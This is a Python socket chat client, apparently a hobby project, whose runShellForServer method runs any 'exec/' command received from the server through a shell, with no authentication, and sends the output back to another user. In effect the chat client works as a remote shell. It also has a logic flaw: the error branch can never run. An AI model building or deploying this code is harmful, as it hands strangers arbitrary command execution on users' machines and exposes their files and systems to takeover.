import socket
import helper
import select
import sys
import os
import subprocess
import encrypt

class myClient():
    host = helper.host
    port = helper.port
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def __init__(self):
        myClient.sock.connect((myClient.host, myClient.port))
        myClient.sock.setblocking(0)

        # Linux Specific
        os.system("clear")

        print("Client Initiated ... \n")
        self.name = input("Your Name : ")
        self.register(self.name)
        welcomeMsg = self.Recv()
        print(welcomeMsg)
        self.startMyClient()

    def register(self, text):
        msg = "reg/" + text.strip()
        self.Send(msg)

    def Send(self, text):
        myClient.sock.send(encrypt.encrypt(text), helper.bufferSize)

    def Recv(self):
        data = myClient.sock.recv(helper.bufferSize)
        return encrypt.decrypt(data)

    def startMyClient(self):
        while True:
            inputready, outputready, excptionready = select.select([sys.stdin, myClient.sock], [], [])
            for i in inputready:
                if i == sys.stdin:
                    msg = self.getClientInput()
                    if msg == "exit/":
                        print("XXX Closing Client XXX")
                        break

                elif i == myClient.sock:
                    self.getServerInput()

                else:
                    break
        self.stopClient()

    def getClientInput(self):
        msg = input("> ")

        if msg == "list" or msg == "exit":
            msg += "/"

        self.Send(msg)
        return msg

    def getServerInput(self):

        msg = self.Recv()
        print(msg)

        tokens = msg.strip().split("/")

        if len(tokens) > 1:
            self.runShellForServer(tokens)
        else:
            pass

    def runShellForServer(self, tokens):
        header = tokens[0] # exec or some commands in future
        tok = tokens[1].strip().split("|")
        sendTo = tok[0]
        body = tok[1]

        if header == "exec":
            print("Executing : ", body)
            op = subprocess.Popen(body, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE,
                                  universal_newlines=True)

            if op:
                output = str(op.stdout.read())
                result = sendTo + "/" + "< " + body + " > \n" + output
                self.Send(result)
            else:
                error = str(op.stderr.read())
                result = sendTo + "/" + "ERROR \n " + error
                self.Send(result)
        else:
            pass

    def stopClient(self):
        print("Client Stopped")
        myClient.sock.close()

def Main():
    client = myClient()

if __name__ == "__main__":
    Main()


